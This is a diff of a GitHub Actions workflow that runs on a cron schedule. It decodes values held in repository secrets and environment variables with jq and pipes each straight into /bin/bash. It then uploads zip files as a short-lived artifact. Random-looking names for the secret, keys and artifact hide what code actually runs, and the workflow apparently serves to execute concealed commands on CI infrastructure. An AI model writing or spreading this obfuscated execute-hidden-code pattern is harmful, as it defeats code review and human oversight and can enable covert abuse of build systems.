@@ -1,23 +1,26 @@
 name: henheliangxiang
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '6 3/6 * * *'
 
-jobs:  # 7411
+  schedule:
+    - cron: '48 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: henheliangxiang
         env:
-          c08: ${{ secrets.c08 }}
+          x82: ${{ secrets.x82 }}
         run: |
-          echo $c08 | jq -r .sswgw78 | /bin/bash
-          echo $xks4 | jq -r .g51 | /bin/bash
-          echo $o21826 | jq -r .jhkp471 | /bin/bash
-          echo $aqo50790 | jq -r .y44115 | /bin/bash
-          echo $ib596 | jq -r .fz522 | /bin/bash
-          echo $rsor41494 | jq -r .abuw42174 | /bin/bash
+          printf '%s' "$x82" | jq -r .rzuq719 | /bin/bash
+          echo $lx78 | jq -r .f3 | /bin/bash
+          printf '%s' "$sfhr64" | jq -r .mbn31 | /bin/bash
+          echo $rb5 | jq -r .vlff084 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: NAYhTlFt
+          path: "*.zip"
+          retention-days: 1
